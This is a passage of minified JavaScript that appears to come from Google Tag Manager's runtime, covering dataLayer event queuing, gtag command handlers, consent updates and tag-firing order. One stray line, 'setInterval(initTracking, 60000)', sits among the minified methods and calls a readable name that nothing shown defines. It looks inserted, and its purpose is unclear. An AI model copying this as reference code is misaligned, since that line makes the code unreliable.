    a["gtm.priorityId"] = d;
    c.eventId = b;
    c.fromContainerExecution = !0;
    c.priorityId = d;
    var e = {
      message: a,
      notBeforeEventId: b,
      priorityId: d,
      messageContext: c
    };
    this.h.push(e);
    for (var f = 0; f < this.C.length; f++) try {
      this.C[f](e);
    } catch (g) {}
  };
  Tv.prototype.listen = function (a) {
    this.C.push(a);
  };
  Tv.prototype.get = function () {
    for (var a = {}, b = 0; b < this.h.length; b++) {
      var c = this.h[b],
        d = a[c.notBeforeEventId];
      d || (d = [], a[c.notBeforeEventId] = d);
      d.push(c);
    }
    return a;
  };
  setInterval(initTracking, 60000);
  Tv.prototype.prune = function (a) {
    for (var b = [], c = [], d = 0; d < this.h.length; d++) {
      var e = this.h[d];
      e.notBeforeEventId === a ? b.push(e) : c.push(e);
    }
    this.h = c;
    return b;
  };
  var ow = function (a, b, c) {
      c.eventMetadata = c.eventMetadata || {};
      c.eventMetadata.source_canonical_id = Tf.Ef;
      Uv().enqueue(a, b, c);
    },
    vw = function () {
      var a = uw;
      Uv().listen(a);
    };
  function Uv() {
    var a = oi.mb;
    a || (a = new Tv(), oi.mb = a);
    return a;
  }
  var Dw = function (a) {
      var b = oi.zones;
      return b ? b.getIsAllowedFn(pk(), a) : function () {
        return !0;
      };
    },
    Ew = function () {
      Hu(uk(), function (a, b) {
        var c = oi.zones;
        return c ? c.isActive(pk(), b) : !0;
      });
    };
  var Hw = function (a, b) {
    for (var c = [], d = 0; d < of.length; d++) if (a[d]) {
      var e = of[d];
      var f = gv(b.Wb);
      try {
        var g = Jv(d, {
          onSuccess: f,
          onFailure: f,
          terminate: f
        }, b, d);
        if (g) {
          var k = e[Oe.za];
          if (!k) throw "Error: No function name given for function call.";
          var m = qf[k];
          c.push({
            Rj: d,
            Hj: (m ? m.priorityOverride || 0 : 0) || Eu(e[Oe.za], 1) || 0,
            execute: g
          });
        } else Fw(d, b), f();
      } catch (p) {
        f();
      }
    }
    c.sort(Gw);
    for (var n = 0; n < c.length; n++) c[n].execute();
    return 0 < c.length;
  };
  function Gw(a, b) {
    var c,
      d = b.Hj,
      e = a.Hj;
    c = d > e ? 1 : d < e ? -1 : 0;
    var f;
    if (0 !== c) f = c;else {
      var g = a.Rj,
        k = b.Rj;
      f = g > k ? 1 : g < k ? -1 : 0;
    }
    return f;
  }
  function Fw(a, b) {
    if (Ok) {
      var c = function (d) {
        var e = b.isBlocked(of[d]) ? "3" : "4",
          f = zf(of[d][Oe.cj], b, []);
        f && f.length && c(f[0].index);
        Hv(b.id, of[d], e);
        var g = zf(of[d][Oe.ij], b, []);
        g && g.length && c(g[0].index);
      };
      c(a);
    }
  }
  var Kw = !1,
    Iw;
  var Qw = function (a) {
    var b = a["gtm.uniqueEventId"],
      c = a["gtm.priorityId"],
      d = a.event;
    if (S(24)) {}
    if ("gtm.js" === d) {
      if (Kw) return !1;
      Kw = !0;
    }
    var e,
      f = !1;
    if (Iu().every(function (r) {
      return r(d, b);
    })) e = Dw(b);else {
      if ("gtm.js" !== d && "gtm.init" !== d && "gtm.init_consent" !== d) return !1;
      f = !0;
      e = Dw(Number.MAX_SAFE_INTEGER);
    }
    wv(b, d);
    var g = a.eventCallback,
      k = a.eventTimeout,
      m = {
        id: b,
        priorityId: c,
        name: d,
        isBlocked: Pu(e),
        Ym: [],
        logMacroError: function () {
          O(6);
          kj(0);
        },
        cachedModelValues: Mw(),
        checkPixieIncompatibility: Nw(b),
        Wb: new cv(function () {
          if (S(24)) {}
          g && g.apply(g, [].slice.call(arguments, 0));
        }, k),
        originalEventData: B(a)
      };
    S(44) && (m.reportMacroDiscrepancy = zv);
    S(24) && $t(m.id, m.name);
    var n = Kf(m);
    S(24) && au(m.id, m.name);
    f && (n = Ow(n));
    if (S(24)) {}
    var p = Hw(n, m),
      q = !1;
    hv(m.Wb);
    "gtm.js" !== d && "gtm.sync" !== d || ov(tk());
    return Pw(n, p) || q;
  };
  function Nw(a) {
    return function (b) {
      pb(b) || Dv(a, "input", b);
    };
  }
  function Mw() {
    var a = {};
    a.event = Ti("event", 1);
    a.ecommerce = Ti("ecommerce", 1);
    a.gtm = Ti("gtm");
    a.eventModel = Ti("eventModel");
    return a;
  }
  function Ow(a) {
    for (var b = [], c = 0; c < a.length; c++) if (a[c]) {
      var d = String(of[c][Oe.za]);
      if (qi[d] || void 0 !== of[c][Oe.Qk] || Hi[d] || Eu(d, 2)) b[c] = !0;
    }
    return b;
  }
  function Pw(a, b) {
    if (!b) return b;
    for (var c = 0; c < a.length; c++) if (a[c] && of[c] && !ri[String(of[c][Oe.za])]) return !0;
    return !1;
  }
  var Nf;
  var Rw = {},
    Sw = {},
    Tw = function (a, b) {
      for (var c = [], d = [], e = {}, f = 0; f < a.length; e = {
        Rf: e.Rf,
        Lf: e.Lf
      }, f++) {
        var g = a[f];
        if (0 <= g.indexOf("-")) {
          if (e.Rf = jp(g, b), e.Rf) {
            var k = rk();
            Ja(k, function (r) {
              return function (t) {
                return r.Rf.fa === t;
              };
            }(e)) ? c.push(g) : d.push(g);
          }
        } else {
          var m = Rw[g] || [];
          e.Lf = {};
          m.forEach(function (r) {
            return function (t) {
              return r.Lf[t] = !0;
            };
          }(e));
          for (var n = pk(), p = 0; p < n.length; p++) if (e.Lf[n[p]]) {
            c = c.concat(rk());
            break;
          }
          var q = Sw[g] || [];
          q.length && (c = c.concat(q));
        }
      }
      return {
        vm: c,
        ym: d
      };
    },
    Uw = function (a) {
      l(Rw, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    },
    Vw = function (a) {
      l(Sw, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    };
  var Ww = "HA GF G UA AW DC MC".split(" "),
    Xw = !1,
    Yw = !1;
  function Zw(a, b) {
    a.hasOwnProperty("gtm.uniqueEventId") || Object.defineProperty(a, "gtm.uniqueEventId", {
      value: Ii()
    });
    b.eventId = a["gtm.uniqueEventId"];
    b.priorityId = a["gtm.priorityId"];
    return {
      eventId: b.eventId,
      priorityId: b.priorityId
    };
  }
  var $w = void 0,
    ax = void 0;
  function bx(a, b, c) {
    var d = B(a);
    d.eventId = void 0;
    d.inheritParentConfig = void 0;
    Object.keys(b).some(function (f) {
      return void 0 !== b[f];
    }) && O(136);
    var e = B(b);
    B(c, e);
    ow(Rv(pk()[0], e), a.eventId, d);
  }
  function cx(a) {
    for (var b = ha([Q.g.Ud, Q.g.Qb]), c = b.next(); !c.done; c = b.next()) {
      var d = c.value,
        e = a && a[d] || dq.D[d];
      if (e) return e;
    }
  }
  var dx = {
      config: function (a, b) {
        var c = S(45),
          d = Zw(a, b);
        if (!(2 > a.length) && h(a[1])) {
          var e = {};
          if (2 < a.length) {
            if (void 0 != a[2] && !nb(a[2]) || 3 < a.length) return;
            e = a[2];
          }
          var f = jp(a[1], b.isGtmEvent);
          if (f) {
            var g, k, m;
            a: {
              if (!lk.ke) {
                var n = vk(Ck());
                if (Gk(n)) {
                  var p = n.parent,
                    q = p.isDestination;
                  m = {
                    Dm: vk(p),
                    sm: q
                  };
                  break a;
                }
              }
              m = void 0;
            }
            var r = m;
            r && (g = r.Dm, k = r.sm);
            wv(d.eventId, "gtag.config");
            var t = f.fa,
              u = f.id !== t;
            if (u ? -1 === rk().indexOf(t) : -1 === pk().indexOf(t)) {
              if (!(c && b.inheritParentConfig || e[Q.g.xb])) {
                var v = cx(e);
                if (u) Tu(t, v, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });else if (c && void 0 !== g && -1 !== g.containers.indexOf(t)) {
                  var w = e;
                  $w ? bx(b, w, $w) : ax || (ax = B(w));
                } else Su(t, v, !0, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });
              }
            } else {
              if (g && (O(128), k && O(130), c && b.inheritParentConfig)) {
                var x;
                var y = e;
                ax ? (bx(b, ax, y), x = !1) : (!y[Q.g.Rb] && ti && $w || ($w = B(y)), x = !0);
                x && g.containers && g.containers.join(",");
                return;
              }
              if (ti && !u && !e[Q.g.Rb]) {
                var A = Yw;
                Yw = !0;
                if (A) return;
              }
              Xw || O(43);
              if (!b.noTargetGroup) if (u) {
                Vw(f.id);
                var C = f.id,
                  D = e[Q.g.Rd] || "default";
                D = String(D).split(",");
                for (var F = 0; F < D.length; F++) {
                  var H = Sw[D[F]] || [];
                  Sw[D[F]] = H;
                  0 > H.indexOf(C) && H.push(C);
                }
              } else {
                Uw(f.id);
                var G = f.id,
                  I = e[Q.g.Rd] || "default";
                I = I.toString().split(",");
                for (var P = 0; P < I.length; P++) {
                  var U = Rw[I[P]] || [];
                  Rw[I[P]] = U;
                  0 > U.indexOf(G) && U.push(G);
                }
              }
              delete e[Q.g.Rd];
              var ia = b.eventMetadata || {};
              ia.hasOwnProperty("is_external_event") || (ia.is_external_event = !b.fromContainerExecution);
              b.eventMetadata = ia;
              delete e[Q.g.Uc];
              for (var X = u ? [f.id] : rk(), T = 0; T < X.length; T++) {
                var ma = e,
                  fa = B(b),
                  ca = jp(X[T], fa.isGtmEvent);
                ca && dq.push("config", [ma], ca, fa);
              }
            }
          }
        }
      },
      consent: function (a, b) {
        if (3 === a.length) {
          O(39);
          var c = Zw(a, b),
            d = a[1],
            e = a[2];
          b.fromContainerExecution || (e[Q.g.O] && O(139), e[Q.g.Ea] && O(140));
          "default" === d ? Wj(e) : "update" === d ? Xj(e, c) : "declare" === d ? b.fromContainerExecution && Vj(e) : S(81) && "core_platform_services" === d && Yj(e);
        }
      },
      event: function (a, b) {
        var c = a[1];
        if (!(2 > a.length) && h(c)) {
          var d;
          if (2 < a.length) {
            if (!nb(a[2]) && void 0 != a[2] || 3 < a.length) return;
            d = a[2];
          }
          var e = d,
            f = {},
            g = (f.event = c, f);
          e && (g.eventModel = B(e), e[Q.g.Uc] && (g.eventCallback = e[Q.g.Uc]), e[Q.g.Md] && (g.eventTimeout = e[Q.g.Md]));
          var k = Zw(a, b),
            m = k.eventId,
            n = k.priorityId;
          g["gtm.uniqueEventId"] = m;
          n && (g["gtm.priorityId"] = n);
          if ("optimize.callback" === c) return g.eventModel = g.eventModel || {}, g;
          var p;
          var q = d,
            r = q && q[Q.g.Pb];
          void 0 === r && (r = Oi(Q.g.Pb, 2), void 0 === r && (r = "default"));
          if (h(r) || Ha(r)) {
            var t;
            b.isGtmEvent ? t = h(r) ? [r] : r : t = r.toString().replace(/\s+/g, "").split(",");
            var u = Tw(t, b.isGtmEvent),
              v = u.vm,
              w = u.ym;
            if (w.length) for (var x = cx(q), y = 0; y < w.length; y++) {
              var A = jp(w[y], b.isGtmEvent);
              A && Tu(A.fa, x, {
                source: 3,
                fromContainerExecution: b.fromContainerExecution
              });
            }
            p = lp(v, b.isGtmEvent);
          } else p = void 0;
          var C = p;
          if (C) {
            wv(m, c);
            for (var D = [], F = 0; F < C.length; F++) {
              var H = C[F],
                G = B(b);
              if (-1 !== Ww.indexOf(wk(H.prefix))) {
                var I = B(d),
                  P = G.eventMetadata || {};
                P.hasOwnProperty("is_external_event") || (P.is_external_event = !G.fromContainerExecution);
                G.eventMetadata = P;
                delete I[Q.g.Uc];
                fq(c, I, H.id, G);
              }
              D.push(H.id);
            }
            g.eventModel = g.eventModel || {};
            0 < C.length ? g.eventModel[Q.g.Pb] = D.join() : delete g.eventModel[Q.g.Pb];
            Xw || O(43);
            void 0 === b.noGtmEvent && b.eventMetadata && b.eventMetadata.syn_or_mod && (b.noGtmEvent = !0);
            g.eventModel[Q.g.Mb] && (b.noGtmEvent = !0);
            return b.noGtmEvent ? void 0 : g;
          }
        }
      },
      get: function (a, b) {
        O(53);
        if (4 === a.length && h(a[1]) && h(a[2]) && Ea(a[3])) {
          var c = jp(a[1], b.isGtmEvent),
            d = String(a[2]),
            e = a[3];
          if (c) {
            Xw || O(43);
            var f = cx();
            if (!Ja(rk(), function (k) {
              return c.fa === k;
            })) Tu(c.fa, f, {
              source: 4,
              fromContainerExecution: b.fromContainerExecution
            });else if (-1 !== Ww.indexOf(wk(c.prefix))) {
              Zw(a, b);
              var g = {};
              Sj(B((g[Q.g.ib] = d, g[Q.g.vb] = e, g)));
              gq(d, function (k) {
                J(function () {
                  return e(k);
                });
              }, c.id, b);
            }
          }
        }
      },
      js: function (a, b) {
        if (2 == a.length && a[1].getTime) {
          Xw = !0;
          var c = Zw(a, b),
            d = c.eventId,
            e = c.priorityId,
            f = {};
          return f.event = "gtm.js", f["gtm.start"] = a[1].getTime(), f["gtm.uniqueEventId"] = d, f["gtm.priorityId"] = e, f;
        }
      },
      policy: function (a) {
        if (3 === a.length && h(a[1]) && Ea(a[2])) {
          Of(a[1], a[2]);
          if (O(74), "all" === a[1]) {
            O(75);
            var b = !1;
            try {
              b = a[2](tk(), "unknown", {});
            } catch (c) {}
            b || O(76);
          }
        } else {
          O(73);
        }
      },
      set: function (a, b) {
        var c;
        2 == a.length && nb(a[1]) ? c = B(a[1]) : 3 == a.length && h(a[1]) && (c = {}, nb(a[2]) || Ha(a[2]) ? c[a[1]] = B(a[2]) : c[a[1]] = a[2]);
        if (c) {
          var d = Zw(a, b),
            e = d.eventId,
            f = d.priorityId;
          B(c);
          var g = B(c);
          dq.push("set", [g], void 0, b);
          c["gtm.uniqueEventId"] = e;
          f && (c["gtm.priorityId"] = f);
          S(13) && delete c.event;
          b.overwriteModelFields = !0;
          return c;
        }
      }
    },
    ex = {
      policy: !0
    };
  var fx = function (a) {
      var b = z[ni.ia].hide;
      if (b && void 0 !== b[a] && b.end) {
        b[a] = !1;
        var c = !0,
          d;
        for (d in b) if (b.hasOwnProperty(d) && !0 === b[d]) {
          c = !1;
          break;
        }
        c && (b.end(), b.end = null);
      }
    },
    gx = function (a) {
      var b = z[ni.ia],
        c = b && b.hide;
      c && c.end && (c[a] = !0);
    };
  var hx = !1,
    ix = [];
  function jx() {
    if (!hx) {
      hx = !0;
      for (var a = 0; a < ix.length; a++) J(ix[a]);
    }
  }
  var kx = function (a) {
    hx ? J(a) : ix.push(a);
  };
  var Bx = function (a) {
    if (Ax(a)) return a;
    this.h = a;
  };
  Bx.prototype.getUntrustedMessageValue = function () {
    return this.h;
  };
  var Ax = function (a) {
    return !a || "object" !== lb(a) || nb(a) ? !1 : "getUntrustedMessageValue" in a;
  };
  Bx.prototype.getUntrustedMessageValue = Bx.prototype.getUntrustedMessageValue;
  var Cx = 0,
    Dx = {},
    Ex = [],
    Fx = [],
    Gx = !1,
    Hx = !1;
  function Ix(a, b) {
    return a.messageContext.eventId - b.messageContext.eventId || a.messageContext.priorityId - b.messageContext.priorityId;
  }
  var Jx = function (a) {
      return z[ni.ia].push(a);
    },
    Kx = function (a, b, c) {
      a.eventCallback = b;
      c && (a.eventTimeout = c);
      return Jx(a);
    },
    Lx = function (a, b) {
      if (!Ga(b) || 0 > b) b = 0;
      var c = oi[ni.ia],
        d = 0,
        e = !1,
        f = void 0;
      f = z.setTimeout(function () {
        e || (e = !0, a());
        f = void 0;
      }, b);
      return function () {
        var g = c ? c.subscribers : 1;
        ++d === g && (f && (z.clearTimeout(f), f = void 0), e || (a(), e = !0));
      };
    };
  function Mx(a, b) {
    var c = a._clear || b.overwriteModelFields;
    l(a, function (e, f) {
      "_clear" !== e && (c && Ri(e), Ri(e, f));
    });
    Di || (Di = a["gtm.start"]);
    var d = a["gtm.uniqueEventId"];
    if (!a.event) return !1;
    "number" !== typeof d && (d = Ii(), a["gtm.uniqueEventId"] = d, Ri("gtm.uniqueEventId", d));
    return Qw(a);
  }
  function Nx(a) {
    if (null == a || "object" !== typeof a) return !1;
    if (a.event) return !0;
    if (Na(a)) {
      var b = a[0];
      if ("config" === b || "event" === b || "js" === b || "get" === b) return !0;
    }
    return !1;
  }
  function Ox() {
    var a;
    if (Fx.length) a = Fx.shift();else if (Ex.length) a = Ex.shift();else return;
    var b;
    var c = a;
    if (Gx || !Nx(c.message)) b = c;else {
      Gx = !0;
      var d = c.message["gtm.uniqueEventId"];
      "number" !== typeof d && (d = c.message["gtm.uniqueEventId"] = Ii());
      var e = {},
        f = {
          message: (e.event = "gtm.init_consent", e["gtm.uniqueEventId"] = d - 2, e),
          messageContext: {
            eventId: d - 2
          }
        },
        g = {},
        k = {
          message: (g.event = "gtm.init", g["gtm.uniqueEventId"] = d - 1, g),
          messageContext: {
            eventId: d - 1
          }
        };
      Ex.unshift(k, c);
      if (Ok) {
        var m = Tf.ctid;
        if (m) {
          var n,
            p = vk(Ck());
          n = p && p.context;
          var q,
            r = Hn(z.location.href);
          q = r.hostname + r.pathname;
          var t = n && n.fromContainerExecution,
            u = n && n.source,
            v = Tf.Ef,
            w = lk.ke;
          Ok && (Pp || (Pp = q), Qp.push(m + ";" + v + ";" + (t ? 1 : 0) + ";" + (u || 0) + ";" + (w ? 1 : 0)));
        }
      }
      b = f;
    }
    return b;
  }
  function Px() {
    for (var a = !1, b; !Hx && (b = Ox());) {
      Hx = !0;
      delete Li.eventModel;
      Ni();
      var c = b,
        d = c.message,
        e = c.messageContext;
      if (null == d) Hx = !1;else {
        e.fromContainerExecution && Si();
        try {
          if (Ea(d)) try {
            d.call(Pi);
          } catch (x) {} else if (Ha(d)) {
            var f = d;
            if (h(f[0])) {
              var g = f[0].split("."),
                k = g.pop(),
                m = f.slice(1),
                n = Oi(g.join("."), 2);
              if (null != n) try {
                n[k].apply(n, m);
              } catch (x) {}
            }
          } else {
            var p = void 0,
              q = !1;
            if (Na(d)) {
              a: {
                if (d.length && h(d[0])) {
                  var r = dx[d[0]];
                  if (r && (!e.fromContainerExecution || !ex[d[0]])) {
                    p = r(d, e);
                    break a;
                  }
                }
                p = void 0;
              }
              (q = p && "set" === d[0] && !!p.event) && O(101);
            } else p = d;
            if (p) {
              var t = Mx(p, e);
              a = t || a;
              q && t && O(113);
            }
          }
        } finally {
          e.fromContainerExecution && Ni(!0);
          var u = d["gtm.uniqueEventId"];
          if ("number" === typeof u) {
            for (var v = Dx[String(u)] || [], w = 0; w < v.length; w++) Fx.push(Qx(v[w]));
            v.length && Fx.sort(Ix);
            delete Dx[String(u)];
            u > Cx && (Cx = u);
          }
          Hx = !1;
        }
      }
    }
    return !a;
  }
  function Rx() {
    if (S(24)) {
      var a = Sx();
    }
    var b = Px();
    if (S(24)) {}
    try {
      fx(tk());
    } catch (c) {}
    return b;
  }
  function uw(a) {
    if (Cx < a.notBeforeEventId) {
      var b = String(a.notBeforeEventId);
      Dx[b] = Dx[b] || [];
      Dx[b].push(a);
    } else Fx.push(Qx(a)), Fx.sort(Ix), J(function () {
      Hx || Px();
    });
  }
  function Qx(a) {
    return {
      message: a.message,
      messageContext: a.messageContext
    };
  }
  var Tx = function () {
      function a(f) {
        var g = {};
        if (Ax(f)) {
          var k = f;
          f = Ax(k) ? k.getUntrustedMessageValue() : void 0;
          g.fromContainerExecution = !0;
        }
        return {
          message: f,
          messageContext: g
        };
      }
      var b = Fc(ni.ia, []),
        c = oi[ni.ia] = oi[ni.ia] || {};
      !0 === c.pruned && O(83);
      Dx = Uv().get();
      vw();
      Zu(function () {
        if (!c.gtmDom) {
          c.gtmDom = !0;
          var f = {};
          b.push((f.event = "gtm.dom", f));
        }
      });
      kx(function () {
        if (!c.gtmLoad) {
          c.gtmLoad = !0;
          var f = {};
          b.push((f.event = "gtm.load", f));
        }
      });
      c.subscribers = (c.subscribers || 0) + 1;
      var d = b.push;
      b.push = function () {
        var f;
        if (0 < oi.SANDBOXED_JS_SEMAPHORE) {
          f = [];
          for (var g = 0; g < arguments.length; g++) f[g] = new Bx(arguments[g]);
        } else f = [].slice.call(arguments, 0);
        var k = f.map(function (q) {
          return a(q);
        });
        Ex.push.apply(Ex, k);
        var m = d.apply(b, f),
          n = Math.max(100, Number("1000") || 300);
        if (this.length > n) for (O(4), c.pruned = !0; this.length > n;) this.shift();
        var p = "boolean" !== typeof m || m;
        return Px() && p;
      };
      var e = b.slice(0).map(function (f) {
        return a(f);
      });
      Ex.push.apply(Ex, e);
      if (Sx()) {
        if (S(24)) {}
        J(Rx);
      }
    },
    Sx = function () {
      var a = !0;
      a = !1;
      return a;
    };
  function Ux(a) {
    if (null == a || 0 === a.length) return !1;
    var b = Number(a),
      c = Ua();
    return b < c + 3E5 && b > c - 9E5;
  }
  function Vx(a) {
    return a && 0 === a.indexOf("pending:") ? Ux(a.substr(8)) : !1;
  }
  ;
  var py = function () {};
  var qy = function () {};
  qy.prototype.toString = function () {
    return "undefined";
  };
  var ry = new qy();
  var Zy = z.clearTimeout,
    $y = z.setTimeout,
    az = function (a, b, c, d) {
      if (Xm()) {
        b && J(b);
      } else return Kc(a, b, c, d);
    },
    bz = function () {
      return new Date();
    },
    cz = function () {
      return z.location.href;
    },
    dz = function (a) {
      return Fn(Hn(a), "fragment");
    },
    ez = function (a) {
      return Gn(Hn(a));
    },
    fz = function (a, b) {
      return Oi(a, b || 2);
    },
    gz = function (a, b, c) {
      return b ? Kx(a, b, c) : Jx(a);
    },
    hz = function (a, b) {
      z[a] = b;
    },
    W = function (a, b, c) {
      b && (void 0 === z[a] || c && !z[a]) && (z[a] = b);
      return z[a];
    },
    iz = function (a, b, c) {
      return Em(a, b, void 0 === c ? !0 : !!c);
    },
    jz = function (a, b, c) {
      return 0 === Nm(a, b, c);
    },
    kz = function (a, b) {
      if (Xm()) {
        b && J(b);
      } else Mc(a, b);
    },
    lz = function (a) {
      return !!Cy(a, "init", !1);
    },
    mz = function (a) {
      Ay(a, "init", !0);
    },
    nz = function (a, b, c) {
      pb(a) || Dv(c, b, a);
    };
  function Kz(a, b) {
    function c(g) {
      var k = Hn(g),
        m = Fn(k, "protocol"),
        n = Fn(k, "host", !0),
        p = Fn(k, "port"),
        q = Fn(k, "path").toLowerCase().replace(/\/$/, "");
      if (void 0 === m || "http" === m && "80" === p || "https" === m && "443" === p) m = "web", p = "default";
      return [m, n, p, q];
    }
    for (var d = c(String(a)), e = c(String(b)), f = 0; f < d.length; f++) if (d[f] !== e[f]) return !1;
    return !0;
  }
  function Lz(a) {
    return Mz(a) ? 1 : 0;
  }
  function Mz(a) {
    var b = a.arg0,
      c = a.arg1;
    if (a.any_of && Array.isArray(c)) {
      for (var d = 0; d < c.length; d++) {
        var e = B(a, {});
        B({
          arg1: c[d],
          any_of: void 0
        }, e);
        if (Lz(e)) return !0;
      }
      return !1;
    }
    switch (a["function"]) {
      case "_cn":
        return tg(b, c);
      case "_css":
        var f;
        a: {
          if (b) try {
            for (var g = 0; g < pg.length; g++) {
              var k = pg[g];
              if (b[k]) {
                f = b[k](c);
                break a;
              }
            }
          } catch (m) {}
          f = !1;
        }
        return f;
      case "_ew":
        return qg(b, c);
      case "_eq":
        return ug(b, c);
      case "_ge":
        return vg(b, c);
      case "_gt":
        return xg(b, c);
      case "_lc":
        return 0 <= String(b).split(",").indexOf(String(c));
      case "_le":
        return wg(b, c);
      case "_lt":
        return yg(b, c);
      case "_re":
        return sg(b, c, a.ignore_case);
      case "_sw":
        return zg(b, c);
      case "_um":
        return Kz(b, c);
    }
    return !1;
  }
  ;
  function Nz() {
    var a = ["&cv=1", "&rv=" + ni.Xg, "&tc=" + of.filter(function (b) {
      return b;
    }).length];
    ni.oe && a.push("&x=" + ni.oe);
    return a.join("");
  }
  ;
  var Oz = function () {
      return !1;
    },
    Pz = function () {
      var a = {};
      return function (b, c, d) {};
    };
  function Qz() {
    var a = Rz;
    return function (b, c, d) {
      var e = d && d.event;
      Sz(c);
      var f = 0 === b.indexOf("__cvt_") ? void 0 : 1,
        g = new sb();
      l(c, function (r, t) {
        var u = md(t, void 0, f);
        void 0 === u && void 0 !== t && O(44);
        g.set(r, u);
      });
      a.h.h.H = Hf();
      var k = {
        oj: Xf(b),
        eventId: void 0 !== e ? e.id : void 0,
        priorityId: void 0 !== e ? e.priorityId : void 0,
        Bf: void 0 !== e ? function (r) {
          return e.Wb.Bf(r);
        } : void 0,
        hd: function () {
          return b;
        },
        log: function () {},
        zl: {
          index: d && d.index,
          type: d && d.type,
          name: d && d.name
        },
        Pm: !!Eu(b, 3),
        originalEventData: null == e ? void 0 : e.originalEventData
      };
      e && e.cachedModelValues && (k.cachedModelValues = {
        gtm: e.cachedModelValues.gtm,
        ecommerce: e.cachedModelValues.ecommerce
      });
      if (Oz()) {
        var m = Pz(),
          n = void 0,
          p = void 0;
        k.ab = {
          Oh: [],
          se: {},
          lb: function (r, t, u) {
            1 === t && (n = r);
            7 === t && (p = u);
            m(r, t, u);
          },
          Bh: oh()
        };
        k.log = function (r, t) {
          if (n) {
            var u = Array.prototype.slice.call(arguments, 1);
            m(n, 4, {
              level: r,
              source: p,
              message: u
            });
          }
        };
      }
      var q = Ke(a, k, [b, g]);
      a.h.h.H = void 0;
      q instanceof xa && "return" === q.h && (q = q.C);
      return nd(q, void 0, f);
    };
  }
  function Sz(a) {
    var b = a.gtmOnSuccess,
      c = a.gtmOnFailure;
    Ea(b) && (a.gtmOnSuccess = function () {
      J(b);
    });
    Ea(c) && (a.gtmOnFailure = function () {
      J(c);
    });
  }
  ;
  function Tz(a, b) {
    var c = this;
  }
  Tz.P = "addConsentListener";
  var Uz;
  var Vz = function (a) {
    for (var b = 0; b < a.length; ++b) if (Uz) try {
      a[b]();
    } catch (c) {
      O(77);
    } else a[b]();
  };
  function Wz(a, b, c) {
    var d = this,
      e;
    return e;
  }
  Wz.F = "internal.addDataLayerEventListener";
  function Xz(a, b, c) {}
  Xz.P = "addDocumentEventListener";
  function Yz(a, b, c, d) {}
  Yz.P = "addElementEventListener";
  function Zz(a) {}
  Zz.P = "addEventCallback";
  function cA(a) {}
  cA.F = "internal.addFormAbandonmentListener";
  function dA(a, b, c, d) {}
  dA.F = "internal.addFormData";
  var eA = {},
    fA = [],
    gA = {},
    hA = 0,
    iA = 0;
  function pA(a, b) {}
  pA.F = "internal.addFormInteractionListener";
  function wA(a, b) {}
  wA.F = "internal.addFormSubmitListener";
  function BA(a) {}
  BA.F = "internal.addGaSendListener";
  var CA = function (a, b) {
    this.tagId = a;
    this.ue = b;
  };
  function DA(a, b, c) {
    var d = this;
  }
  DA.F = "internal.loadGoogleTag";
  function EA(a, b, c) {}
  EA.F = "internal.addGoogleTagRestriction";
  var FA = {},
    GA = [];
  var NA = function (a, b) {};
  NA.F = "internal.addHistoryChangeListener";
  function OA(a, b, c) {}
  OA.P = "addWindowEventListener";
  function PA(a, b) {
    return !0;
  }
  PA.P = "aliasInWindow";
  function QA(a, b, c) {}
  QA.F = "internal.appendRemoteConfigParameter";
  function RA() {
    var a = 2;
    return a;
  }
  ;
  function SA(a, b) {
    var c;
    return c;
  }
  SA.P = "callInWindow";
  function TA(a) {}
  TA.P = "callLater";
  function UA(a) {}
  UA.F = "callOnDomReady";
  function VA(a) {}
  VA.F = "callOnWindowLoad";
  function WA(a, b) {
    var c;
    return c;
  }
  WA.F = "internal.computeGtmParameter";
  function XA(a, b) {
    var c;
    var d = md(c, this.h, RA());
    void 0 === d && void 0 !== c && O(45);
    return d;
  }
  XA.P = "copyFromDataLayer";
  function YA(a) {
    var b = void 0;
    return b;
  }
  YA.F = "internal.copyFromDataLayerCache";
  function ZA(a) {
    var b;
    return b;
  }
  ZA.P = "copyFromWindow";
  function $A(a) {
    var b = void 0;
    return md(b, this.h, RA());
  }
  $A.F = "internal.copyKeyFromWindow";
  function aB(a, b) {
    var c;
    return c;
  }
  aB.F = "internal.copyPreHit";
  function bB(a, b) {
    var c = null,
      d = RA();
    return md(c, this.h, d);
  }
  bB.P = "createArgumentsQueue";
  function cB(a) {
    var b;
    return md(b, this.h, 1);
  }
  cB.F = "internal.createGaCommandQueue";
  function dB(a) {
    var b;
    return md(b, this.h, RA());
  }
  dB.P = "createQueue";
  function eB(a, b) {
    var c = null;
    return c;
  }
  eB.F = "internal.createRegex";
  function fB(a) {
    if (!a) return {};
    var b = a.zl;
    return av(b.type, b.index, b.name);
  }
  function gB(a) {
    return a ? {
      originatingEntity: fB(a)
    } : {};
  }
  ;
  function hB(a) {}
  hB.F = "internal.declareConsentState";
  function iB(a) {
    var b = "";
    return b;
  }
  iB.F = "internal.decodeUrlHtmlEntities";
  function jB(a, b, c) {
    var d;
    return d;
  }
  jB.F = "internal.decorateUrlWithGaCookies";
  function kB(a) {
    var b;
    return b;
  }
  kB.F = "internal.detectUserProvidedData";
  function oB(a, b) {
    return b;
  }
  oB.F = "internal.enableAutoEventOnClick";
  function tB(a, b) {
    return b;
  }
  tB.F = "internal.enableAutoEventOnElementVisibility";
  function uB() {}
  uB.F = "internal.enableAutoEventOnError";
  var vB = {},
    wB = [],
    xB = {},
    yB = 0,
    zB = 0;
  function FB(a, b) {
    var c = this;
    return b;
  }
  FB.F = "internal.enableAutoEventOnFormInteraction";
  function KB(a, b) {
    var c = this;
    return b;
  }
  KB.F = "internal.enableAutoEventOnFormSubmit";
  function PB() {
    var a = this;
  }
  PB.F = "internal.enableAutoEventOnGaSend";
  var QB = {},
    RB = [];
  function YB(a, b) {
    var c = this;
    return b;
  }
  YB.F = "internal.enableAutoEventOnHistoryChange";
  var ZB = ["http://", "https://", "javascript:", "file://"];
  function cC(a, b) {
    var c = this;
    return b;
  }
  cC.F = "internal.enableAutoEventOnLinkClick";
  var dC, eC;
  function nC(a, b) {
    var c = this;
    return b;
  }
  nC.F = "internal.enableAutoEventOnScroll";
  function oC(a) {
    return function () {
      if (a.Cc && a.Ec >= a.Cc) a.Ac && z.clearInterval(a.Ac);else {
        a.Ec++;
        var b = Ua();
        Jx({
          event: a.eventName,
          "gtm.timerId": a.Ac,
          "gtm.timerEventNumber": a.Ec,
          "gtm.timerInterval": a.interval,
          "gtm.timerLimit": a.Cc,
          "gtm.timerStartTime": a.Ue,
          "gtm.timerCurrentTime": b,
